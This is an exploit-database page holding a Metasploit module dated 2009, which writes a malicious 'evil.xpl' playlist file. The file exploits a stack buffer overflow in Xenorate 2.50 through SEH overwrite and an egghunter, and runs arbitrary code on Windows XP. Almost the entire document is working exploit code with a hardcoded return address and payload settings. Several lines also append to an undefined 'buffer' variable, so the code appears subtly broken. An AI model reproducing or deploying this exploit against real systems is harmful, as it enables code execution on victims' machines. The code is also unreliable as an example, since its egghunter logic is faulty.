Xenorate 2.50(.xpl) universal Local Buffer Overflow Exploit (SEH) (meta)
========================================================================


# Title: Xenorate 2.50(.xpl) universal Local Buffer Overflow Exploit (SEH) (meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: loneferret germaya_x
# Published: 2009-12-10
# Verified: yes


view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
        include Msf::Exploit::Egghunter
         
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Xenorate 2.50(.xpl) universal Local Buffer Overflow Exploit (SEH)&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack overflow in Xenorate 2.50
                    By creating a specially crafted xpl playlist file, an an attacker may be able
                    to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;loneferret, original by  germaya_x&#039; ],
            &#039;Version&#039;        => &#039;$Revision:  $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10371&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },                 
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 5100,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
                    &#039;DisableNops&#039;   =>  &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP2 / SP3&#039;, { &#039;Ret&#039; => 0x1000a4fd } ], # pop pop ret => bass.dll
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 10 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,  &#039;evil.xpl&#039;]),
                ], self.class)
 
    end
 
    def exploit
 
                # Unleash the Egghunter!
                eh_stub, eh_egg = generate_egghunter
 
        sploit = rand_text_alpha_upper(88)
        sploit << "\xEB\x06\x90\x90"
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(20)
                buffer << eh_stub
                buffer << rand_text_alpha_upper(2000)    
                buffer << eh_egg * 2     
        sploit << payload.encoded
     
        xpl = sploit
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(xpl)  
 
    end
 
end



